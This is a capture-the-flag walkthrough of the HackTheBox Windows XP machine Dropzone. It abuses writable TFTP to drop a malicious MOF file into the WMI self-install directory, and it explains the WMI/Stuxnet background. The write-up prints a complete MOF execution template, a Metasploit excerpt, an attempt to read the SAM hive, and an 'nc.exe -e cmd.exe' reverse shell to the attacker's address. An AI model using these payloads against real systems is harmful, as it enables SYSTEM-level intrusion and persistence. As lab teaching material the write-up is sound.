---
title: HTB: Dropzone
url: https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html
date: 2018-11-03T14:48:42+00:00
difficulty: Hard [40]
os: Windows
tags: hackthebox, htb-dropzone, ctf, xp, tftp, mof, wmi, stuxnet, alternative-data-streams, sysinternals
---

![](https://0xdfimages.gitlab.io/img/Parachute-win.png) Dropzone was unique in many ways. Right off the bat, an initial nmap scan shows no TCP ports open. I’ll find unauthenticated TFTP on UDP 69, and use that access identify the host OS as Windows XP. From there, I’ll use TFTP to drop a malicious mof file where it will automatically compiled, giving me code execution, in a technique made well know by Stuxnet (though not via TFTP, but rather a SMB 0-day). This technique provides a system shell, but there’s one more twist, as I’ll have to find the flags in alternative data streams of a text file on the desktop. I’ll also take this opportunity to dive in on WMI / MOF and how they were used in Stuxnet.

## Box Info

| Name | [Dropzone](https://hackthebox.com/machines/dropzone)  [Dropzone](https://hackthebox.com/machines/dropzone) [Play on HackTheBox](https://hackthebox.com/machines/dropzone) |
| --- | --- |
| Release Date | 19 May 2018 |
| Retire Date | 04 May 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Dropzone |
| Radar Graph | Radar chart for Dropzone |
| First Blood User | 05:47:39[manolis manolis](https://app.hackthebox.com/users/29085) |
| First Blood Root | 05:47:19[manolis manolis](https://app.hackthebox.com/users/29085) |
| Creators | [eks eks](https://app.hackthebox.com/users/302)  [rjesh rjesh](https://app.hackthebox.com/users/39054) |

## Recon

### nmap

Initial scan shows no TCP ports, but TFTP is open on UDP 69:

```

root@kali# nmap -p- -sT -oA nmap/alltcp --min-rate 5000 10.10.10.90
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-23 07:10 EDT
Nmap scan report for 10.10.10.90
Host is up (0.10s latency).
All 65535 scanned ports on 10.10.10.90 are filtered

Nmap done: 1 IP address (1 host up) scanned in 67.77 seconds

root@kali# nmap -p- -sU -oA nmap/alludp --min-rate 5000 10.10.10.90
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-23 07:11 EDT
Nmap scan report for 10.10.10.90
Host is up (0.12s latency).
Not shown: 65534 open|filtered ports
PORT   STATE SERVICE
69/udp open  tftp

Nmap done: 1 IP address (1 host up) scanned in 26.82 seconds

root@kali# nmap -sV -sC -sU -p 69 -oA nmap/tftp 10.10.10.90
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-23 07:12 EDT
Nmap scan report for 10.10.10.90
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
69/udp open  tftp    SolarWinds Free tftpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds

```

### tftp

#### Capabilities

With tftp access to the box, we can put and get files, but not much else. There’s no ability to run commands or list files.

```

tftp> ?
Commands may be abbreviated.  Commands are:

connect         connect to remote tftp
mode            set file transfer mode
put             send file
get             receive file
quit            exit tftp
verbose         toggle verbose mode
trace           toggle packet tracing
status          show current status
binary          set mode to octet
ascii           set mode to netascii
rexmt           set per-packet retransmission timeout
timeout         set total retransmission timeout
?               print help information

```

#### Enumeration Experimentation

Start by doing some experiments. I created a file `test.txt`, and started getting and putting:

```

tftp> put test.txt
tftp> get test.txt
tftp> get no_exist.txt
Error code 1: Could not find file 'C:\no_exist.txt'.

```

So I can write to the root, and the tftp root is the machine c:\ root.

Can I grab passwords from the SAM hive?

```

tftp> get \windows\system32\config\sam
Error code 1: The process cannot access the file 'C:\windows\system32\config\sam' because it is being used by another process.

```

Well that’s interesting. No error about permissions, but rather just about the file being in use. I am likely running as a privileged user.

#### OS Determination

`\windows\system32\license.rtf` and/or `\windows\system32\eula.txt` will help determine the Windows OS version based.

```

tftp> get \windows\system32\license.rtf
Error code 1: Could not find file 'C:\windows\system32\license.rtf'.
tftp> get \windows\system32\eula.txt
Received 41543 bytes in 28.7 seconds

```

```

root@kali# head '\windows\system32\eula.txt'
END-USER LICENSE AGREEMENT FOR MICROSOFT
SOFTWARE

MICROSOFT WINDOWS XP PROFESSIONAL EDITION
SERVICE PACK 3

IMPORTANT-READ CAREFULLY: This End-User
License Agreement ('EULA') is a legal
agreement between you (either an individual
or a single entity) and Microsoft Corporation

```

So this is a Windows XP SP3 box. No wonder nothing is open, as it would be vulnerable to a ton of different exploits.

#### Read/Write to System32

Being able to write to `system32` is quite useful. I did a simple test:

```

tftp> put nc.exe \windows\system32\nc.exe
Sent 38866 bytes in 29.3 seconds
tftp> get \windows\system32\nc.exe
Received 38866 bytes in 28.0 seconds

```

```

root@kali# md5sum *nc.exe
5dcf26e3fbce71902b0cd7c72c60545b  nc.exe
5dcf26e3fbce71902b0cd7c72c60545b  \\windows\\system32\\nc.exe

```

Looks like I can write and read from System32. This adds more weight to the idea that I’m already running as system, and will come in handy for exploitation. It’s also nice to have a working copy of `nc` on target.

#### Binary Mode

When I’m uploading binary files (anything non-text) via tftp, it’s important to switch to binary mode, or else the binaries will be corrupted in transfer.

On initial connection, it will typically be in ascii mode, as shown on the 3rd line below:

```

tftp> status
Connected to 10.10.10.90.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds

```

It can easily be changed to binary (or “octet”) mode:

```

tftp> binary
tftp> status
Connected to 10.10.10.90.
Mode: octet Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds

```

## MOF File WMI Exploitation –> SYSTEM Shell

### Background

#### WMI

[Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page) (WMI) is a complex set of interfaces to management data and operations on a Windows-based OS. It consists of classes and objects that are stored in the “WMI repository”:

![1539272934610](https://0xdfimages.gitlab.io/img/1539272934610.png)

A full understanding of WMI is well beyond the scope of this post, but there are few classes that I’ll need to use for this attack:
- `EventFilter` - This class allows you to define some Windows event. Think of this as the thing you are looking for, or a trigger.
- `EventConsumer` - Consumers define some action that will be taken. There are [6 standard implementations](https://docs.microsoft.com/en-us/windows/desktop/wmisdk/standard-consumer-classes) of the `EventConsumer` class:
  - `ActiveScriptEventConsumer` - Executes a script
  - `CommandLineEventConsumer` - Executes a process
  - `LogFileEventConsumer` - Writes a log file
  - `NTEventLogEventConsumer` - Writes a Windows event log
  - `SMTPEventConsumer` - Sends an email using SMTP
- `FilterToConsumerBinding` - Objects of this class link an instance of a Filter (trigger) with a Consumer (action).

If this is interesting to you, there’ a bunch more out there on how to abuse WMI for malicious purposes. Some good YouTube Videos:
- [Abusing Windows Management Instrumentation](https://www.youtube.com/watch?v=0SjMgnGwpq8) - Blackhat 2015
- [There’s Something About WMI](https://www.youtube.com/watch?v=JCJl2uV8u1c) - Sans DFIR 2015

#### MOF

There is a file format known as [MOF files](https://technet.microsoft.com/en-us/library/cc180827.aspx), which are used to store WMI data in a text format. MOF files can be compiled by `mofcomp.exe` and stored in the Windows WMI repository. Moreover, there is a “MOF Self-Install Directory”, such that any MOF file dropped in that directory will be processed automatically. It’s set in the registry at `HKLM\SOFTWARE\Microsoft\WBEM\CIMON\`, and the default value is `%SYSTEMROOT%\System32\wbem\mof\`.

![](https://0xdfimages.gitlab.io/img/dropzone_registry_key.png)

#### Stuxnet / MS10-061

One of the zero day vulnerabilities exploited by Stuxnet was [MS10-061](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-061). This vulnerability is often referred to as a Remote Code Execution vulnerability, but in fact, it actually provides the ability to write a file as the Printer Spooler service on a host. It’s this file write ability combined with the MOF Self-Install Directory that allows for code execution. [This post on poppopret](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html) does a great job of digging into more detail.

Another way to see this in action is to look at the source code for the [Metasploit MS10-061 exploit](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb). After a bunch of setup, it connects to the printer, and then does two file writes:

```

      # NOTE: fname can be anything nice to write to (cwd is system32), even
      # directory traversal and full paths are OK.
      fname = rand_text_alphanumeric(14) + ".exe"
      write_file_contents(ph, fname, exe)

      # Generate a MOF file and write it so that the Windows Management Service will
      # execute our binary ;)
      mofname = rand_text_alphanumeric(14) + ".mof"
      mof = generate_mof(mofname, fname)
      write_file_contents(ph, "wbem\\mof\\#{mofname}", mof)

```

The first is to put the payload (something like `windows/meterpreter/reverse_tcp` or `windows/shell_bind_tcp`) on target in the form of an exe. The second writes a MOF file built to run that exe to the Self-Install directory.

### Exploitation

#### Approach

Dropzone isn’t vulnerable to MS10-061 because printer and file sharing isn’t accessible. But I can write files a different way, using TFTP. If I can write a malicious MOF file to the Self-Install directory, then `mofcomp.exe` will compile and run the given WMI. If I craft that MOF file to include an `ActiveScriptEventConsumer` or `CommandLineEventConsumer`, I can have the target run whatever I want, as SYSTEM.

#### Template

Because these are complex files, with a lot of room for error and not much in the way of feedback, I took the approach of starting with the Metasploit script for creating MOF files as a template (*July 2023 update*: the file has since been renamed in Metasploit - [here](https://github.com/rapid7/metasploit-framework/blob/7e5e0f7fc814fee55a1eca148c51f2344da65e59/lib/msf/core/exploit/wbemexec.rb) is the file from when this post was published, and [here](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbem_exec.rb) is the current version). Almost that entire script is a text string, where a few variables are replaced to produce a mof file. Specifically, four updates are needed:
- Replace `@CLASS@` with a random number
- Replace `@EXE@` with command to run
- Replace `#{mofname}` with a mofname - I’ll use `a.mof`
- Fix escaping - Because the template is inside a ruby program, all of the `\`s are escaped. When writing a mof, we’ll reduce the escaping by one.

I’ll take care of three of those changes to create this template (leaving the `@EXE@` for later):

```

  1 #pragma namespace("\\\\.\\root\\cimv2")
  2 class MyClass12588
  3 {
  4         [key] string Name;
  5 };
  6 class ActiveScriptEventConsumer : __EventConsumer
  7 {
  8         [key] string Name;
  9         [not_null] string ScriptingEngine;
 10         string ScriptFileName;
 11         [template] string ScriptText;
 12   uint32 KillTimeout;
 13 };
 14 instance of __Win32Provider as $P
 15 {
 16     Name  = "ActiveScriptEventConsumer";
 17     CLSID = "{266c72e7-62e8-11d1-ad89-00c04fd8fdff}";
 18     PerUserInitialization = TRUE;
 19 };
 20 instance of __EventConsumerProviderRegistration
 21 {
 22   Provider = $P;
 23   ConsumerClassNames = {"ActiveScriptEventConsumer"};
 24 };
 25 Instance of ActiveScriptEventConsumer as $cons
 26 {
 27   Name = "ASEC";
 28   ScriptingEngine = "JScript";
 29   ScriptText = "\ntry {var s = new ActiveXObject(\"Wscript.Shell\");\ns.Run(\"@EXE@\");} catch (err) {};\nsv = GetObject(\"winmgmts:root\\\\cimv2\");try {sv.Delete(\"MyClass12588\");} catch (err) {};try {sv.Delete(\"__EventFilter.Name='instfilt'\");} catch (err) {};try {sv.Delete(\"ActiveScriptEventConsumer.Name='ASEC'\");}       catch(err) {};";
 30
 31 };
 32 Instance of ActiveScriptEventConsumer as $cons2
 33 {
 34   Name = "qndASEC";
 35   ScriptingEngine = "JScript";
 36   ScriptText = "\nvar objfs = new ActiveXObject(\"Scripting.FileSystemObject\");\ntry {var f1 = objfs.GetFile(\"wbem\\\\mof\\\\good\\\\a.mof\");\nf1.Delete(true);} catch(err) {};\ntry {\nvar f2 = objfs.GetFile(\"@EXE@\");\nf2.Delete(true);\nvar s = GetObject(\"winmgmts:root\\\\cimv2\");s.Delete(\"__EventFilter.       Name='qndfilt'\");s.Delete(\"ActiveScriptEventConsumer.Name='qndASEC'\");\n} catch(err) {};";
 37 };
 38 instance of __EventFilter as $Filt
 39 {
 40   Name = "instfilt";
 41   Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = \"MyClass12588\"";
 42   QueryLanguage = "WQL";
 43 };
 44 instance of __EventFilter as $Filt2
 45 {
 46   Name = "qndfilt";
 47   Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name = \"@EXE@\"";
 48   QueryLanguage = "WQL";
 49
 50 };
 51 instance of __FilterToConsumerBinding as $bind
 52 {
 53   Consumer = $cons;
 54   Filter = $Filt;
 55 };
 56 instance of __FilterToConsumerBinding as $bind2
 57 {
 58   Consumer = $cons2;
 59   Filter = $Filt2;
 60 };
 61 instance of MyClass12588 as $MyClass
 62 {
 63   Name = "ClassConsumer";
 64 }

```

Walking through that file, here are the interesting parts:
- On line 2, define a class with a random name, `MyClass12588`. It’s quite simple, just has a name object.
- On line 25, define an `ActiveScriptEventConsumer` and call it `$cons`. This script is responsible for running my yet to be defined command.
- On line 32, define a second `ActiveScriptEventConsumer`, and call it `$cons2`. This script attempts to delete my mof file.
- On line 38, define an `EventFilter`, and call it `$Filt`, which uses a query language called “WQL” to look for instance creation events for a objects of a class `MyClass12588`.
- On line 44, define a second `EventFilter`, and call it `$Filt2`, which looks for a process creation with an instance name matching the to be defined process.
- On line 51, define a `FilterToConsumerBinding`, call it `$bind`, and have it connect `$cons` and `$Filt`. So now, whenever an instance of `MyClass12588` is created, our code will run.
- On line 56, define another `FilterToConsumerBinding`, call it `$bind2`, and have it connect `$cons2` and `$Filt2`. So now, whenever a process starts that matches our process, it will try to delete our mof file.
- Now with all the dominos set up, on line 61, it creates an instance of `MyClass12588`, which starts the chain reaction.

#### ping

as a first test, I will try to get the machine to ping my workstation. I’ll put `ping.exe 10.10.14.3` in the place of `@EXE@` in the template, and save it as `ping.mof`. Next, upload it via tftp, and watch the pings return with tcpdump in the lower tmux window:

![ping](https://0xdfimages.gitlab.io/img/dropzone-ping.gif)

#### Shell

Now that I’ve proven code execution, I’ll try to get a shell with `nc`. First, upload nc.exe to `system32` (make sure to switch to binary mode first, or the uploaded exe will be corrupt). Since that will be in the path, I don’t have to worry about giving a full path in the template (if I wanted to do full path, I could double escape, so `\\\\windows\\\\system32\\\\nc.exe`). Then I update the template with `nc.exe -e cmd.exe 10.10.14.3 443`.

Upload, and shell:

![shell](https://0xdfimages.gitlab.io/img/dropzone-shell.gif)

Windows XP actually doesn’t have `whoami`, but I can check the environment variables to get a good idea that I’m running as SYSTEM (see two comments added by me):

```

C:\WINDOWS\system32>set
ALLUSERSPROFILE=C:\Documents and Settings\All Users
CommonProgramFiles=C:\Program Files\Common Files
COMPUTERNAME=DROPZONE
ComSpec=C:\WINDOWS\system32\cmd.exe
FP_NO_HOST_CHECK=NO
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
PROCESSOR_ARCHITECTURE=x86
PROCESSOR_IDENTIFIER=x86 Family 6 Model 63 Stepping 2, GenuineIntel
PROCESSOR_LEVEL=6
PROCESSOR_REVISION=3f02
ProgramFiles=C:\Program Files
PROMPT=$P$G
SystemDrive=C:
SystemRoot=C:\WINDOWS
TEMP=C:\WINDOWS\TEMP                                    <-- TEMP is not in %USERPROFILE%\Local Settings\
TMP=C:\WINDOWS\TEMP
USERPROFILE=C:\WINDOWS\system32\config\systemprofile    <-- USERPROFILE in system32, not \Documents and Settings\{username}
windir=C:\WINDOWS

```

Alternatively, I can just upload `whoami.exe` (on Kali in `/usr/share/windows-binaries/`):

```

tftp> put ../whoami.exe \windows\system32\whoami.exe
Sent 66560 bytes in 2.7 seconds

```

```

C:\WINDOWS\system32>whoami
NT AUTHORITY\SYSTEM

```

## Flags

### Enumeration

Administrator is the only user:

```

C:\Documents and Settings>dir
 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings

09/05/2018  08:50     <DIR>          .
09/05/2018  08:50     <DIR>          ..
09/05/2018  10:20     <DIR>          Administrator
09/05/2018  05:21     <DIR>          All Users

```

Naturally, I’ll check the desktop for flags. Right away I’ll notice that `root.txt` is the wrong size:

```

C:\Documents and Settings\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings\Administrator\Desktop

10/05/2018  10:10     <DIR>          .
10/05/2018  10:10     <DIR>          ..
10/05/2018  10:10     <DIR>          flags
10/05/2018  10:12                 31 root.txt
               1 File(s)             31 bytes
               3 Dir(s)   6.804.090.880 bytes free

C:\Documents and Settings\Administrator\Desktop>type root.txt
It's easy, but not THAT easy...

```

Well, check the flags directory:

```

C:\Documents and Settings\Administrator\Desktop\flags>dir
 Volume in drive C has no label.
 Volume Serial Number is 7CF6-55F6

 Directory of C:\Documents and Settings\Administrator\Desktop\flags

10/05/2018  10:10     <DIR>          .
10/05/2018  10:10     <DIR>          ..
10/05/2018  10:09                 76 2 for the price of 1!.txt
               1 File(s)             76 bytes
               2 Dir(s)   6.804.086.784 bytes free

C:\Documents and Settings\Administrator\Desktop\flags>type 2*

2 for the price of 1!.txt

For limited time only!

Keep an eye on our ADS for new offers & discounts!

```

### Alternative Data Streams

Clearly the note is a reference to alternative data streams (ADS). In modern Windows, I would use `dir /R` to look at streams, but this XP cmd doesn’t have that option:

```

C:\Documents and Settings\Administrator\Desktop\flags>dir /?
Displays a list of files and subdirectories in a directory.

DIR [drive:][path][filename] [/A[[:]attributes]] [/B] [/C] [/D] [/L] [/N]
  [/O[[:]sortorder]] [/P] [/Q] [/S] [/T[[:]timefield]] [/W] [/X] [/4]

  [drive:][path][filename]
              Specifies drive, directory, and/or files to list.

  /A          Displays files with specified attributes.
  attributes   D  Directories                R  Read-only files
               H  Hidden files               A  Files ready for archiving
               S  System files               -  Prefix meaning not
  /B          Uses bare format (no heading information or summary).
  /C          Display the thousand separator in file sizes.  This is the
              default.  Use /-C to disable display of separator.
  /D          Same as wide but files are list sorted by column.
  /L          Uses lowercase.
  /N          New long list format where filenames are on the far right.
  /O          List by files in sorted order.
  sortorder    N  By name (alphabetic)       S  By size (smallest first)
               E  By extension (alphabetic)  D  By date/time (oldest first)
               G  Group directories first    -  Prefix to reverse order
  /P          Pauses after each screenful of information.
  /Q          Display the owner of the file.
  /S          Displays files in specified directory and all subdirectories.
  /T          Controls which time field displayed or used for sorting
  timefield   C  Creation
              A  Last Access
              W  Last Written
  /W          Uses wide list format.
  /X          This displays the short names generated for non-8dot3 file
              names.  The format is that of /N with the short name inserted
              before the long name. If no short name is present, blanks are
              displayed in its place.
  /4          Displays four-digit years

Switches may be preset in the DIRCMD environment variable.  Override
preset switches by prefixing any switch with - (hyphen)--for example, /-W.

```

PowerShell could do it, but there’s no PowerShell installed either.

I’ll use `streams.exe` (from [sysinterals](https://docs.microsoft.com/en-us/sysinternals/downloads/streams)). First upload via TFTP, then run, and the flags are actually the stream names:

```

tftp> put streams.exe
putting streams.exe to 10.10.10.90:streams.exe [octet]
Sent 135840 bytes in 109.3 seconds [9943 bits/sec]

```

```

C:\>move streams.exe \windows\temp
C:\Documents and Settings\Administrator>\windows\temp\streams -s -accepteula .

streams v1.60 - Reveal NTFS alternate streams.
Copyright (C) 2005-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
   :root_txt_3316ffe0...:$DATA     5
   :user_txt_a6a4830d...:$DATA     5

```